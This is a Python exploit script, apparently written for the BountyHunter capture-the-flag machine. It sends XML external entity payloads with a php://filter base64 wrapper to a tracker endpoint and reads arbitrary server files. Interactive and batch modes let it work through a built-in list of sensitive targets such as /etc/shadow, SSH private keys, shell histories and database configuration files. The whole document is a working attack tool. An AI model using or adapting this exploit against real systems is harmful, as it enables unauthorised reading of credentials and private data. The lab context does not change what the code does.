import traceback
import requests 
import base64
import re
import sys

def xxe_read_file(file_path, url="http://bountyhunter.htb:80/tracker_diRbPr00f314.php"):
    """Generic function to read any file via XXE exploitation"""
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    
    # Create the XXE payload for the specified file
    xxe_payload = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE scan [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource={file_path}">]>
    <bugreport>
        <title>&file;</title>
        <cwe>CWE-99</cwe>
        <cvss>9.1</cvss>
        <reward>1234</reward>
    </bugreport>'''
    
    # Base64 encode the payload
    encoded_payload = base64.b64encode(xxe_payload.encode()).decode()
    data = {"data": encoded_payload}
    
    print(f"[*] Reading file: {file_path}")
    print(f"[*] Target URL: {url}")
    
    try:
        response = requests.post(url, headers=headers, data=data)
        
        # Extract base64 content using regex
        pattern = r'<td>Title:</td>\s*<td>([A-Za-z0-9+/=]+)</td>'
        match = re.search(pattern, response.text)
        
        if match:
            base64_content = match.group(1)
            print(f"[+] Extracted base64 content: {base64_content[:50]}...")
            
            try:
                decoded_content = base64.b64decode(base64_content).decode('utf-8')
                print(f"[+] Content of {file_path}:")
                print("=" * 60)
                print(decoded_content)
                print("=" * 60)
                return decoded_content
            except UnicodeDecodeError:
                # Handle binary files
                print(f"[!] File appears to be binary, showing raw base64:")
                print(base64_content)
                return base64_content
            except Exception as e:
                print(f"[-] Error decoding base64: {e}")
                return None
        else:
            print("[-] Could not extract base64 content")
            print(f"[!] Full response: {response.text}")
            return None
            
    except Exception as e:
        print(f"[-] Error reading file {file_path}: {e}")
        traceback.print_exc()
        return None

def interactive_mode():
    """Interactive mode to read multiple files"""
    print("\n[*] Interactive XXE File Reader")
    print("[*] Type 'exit' to quit, 'help' for common files")
    
    while True:
        try:
            file_path = input("\nEnter file path to read: ").strip()
            
            if file_path.lower() == 'exit':
                print("[*] Exiting...")
                break
            elif file_path.lower() == 'help':
                print_common_files()
                continue
            elif not file_path:
                print("[-] Please enter a valid file path")
                continue
            
            result = xxe_read_file(file_path)
            if result:
                save_option = input("\nSave to file? (y/n): ").strip().lower()
                if save_option == 'y':
                    filename = input("Enter filename to save: ").strip()
                    if filename:
                        try:
                            with open(filename, 'w') as f:
                                f.write(result)
                            print(f"[+] Content saved to {filename}")
                        except Exception as e:
                            print(f"[-] Error saving file: {e}")
                            
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

def print_common_files():
    """Print common files to read during CTF/Pentesting"""
    common_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/proc/version",
        "/proc/cmdline",
        "/proc/meminfo",
        "/proc/cpuinfo",
        "/home/development/.ssh/id_rsa",
        "/home/development/.ssh/id_rsa.pub",
        "/home/development/.bash_history",
        "/var/www/html/index.php",
        "/var/www/html/db.php",
        "/var/www/html/portal.php",
        "/var/www/html/log_submit.php",
        "/var/www/html/tracker_diRbPr00f314.php",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/etc/apache2/sites-enabled/000-default.conf",
        "/etc/mysql/my.cnf",
        "/root/.bash_history",
        "/etc/crontab",
        "/etc/fstab"
    ]
    
    print("\n[*] Common files to read:")
    for i, file_path in enumerate(common_files, 1):
        print(f"{i:2d}. {file_path}")

def batch_read_files(file_list):
    """Read multiple files from a list"""
    results = {}
    print(f"[*] Reading {len(file_list)} files...")
    
    for file_path in file_list:
        result = xxe_read_file(file_path)
        results[file_path] = result
        print("-" * 40)
    
    return results

if __name__ == "__main__":
    print("XXE File Reader - Generic Exploitation Script")
    print("=" * 50)
    
    # Check command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "-i" or sys.argv[1] == "--interactive":
            interactive_mode()
        elif sys.argv[1] == "-h" or sys.argv[1] == "--help":
            print("Usage:")
            print("  python xxe_reader.py                    # Read /etc/passwd (default)")
            print("  python xxe_reader.py -i                 # Interactive mode")
            print("  python xxe_reader.py /path/to/file      # Read specific file")
            print("  python xxe_reader.py --common           # Read common files")
            print("  python xxe_reader.py -h                 # Show help")
        elif sys.argv[1] == "--common":
            common_files = [
                "/etc/passwd",
                "/etc/hosts",
                "/etc/hostname",
                "/proc/version",
                "/home/development/.bash_history"
            ]
            batch_read_files(common_files)
        else:
            # Read specific file from command line
            file_path = sys.argv[1]
            xxe_read_file(file_path)
    else:
        # Default: read /etc/passwd
        xxe_read_file("/etc/passwd")
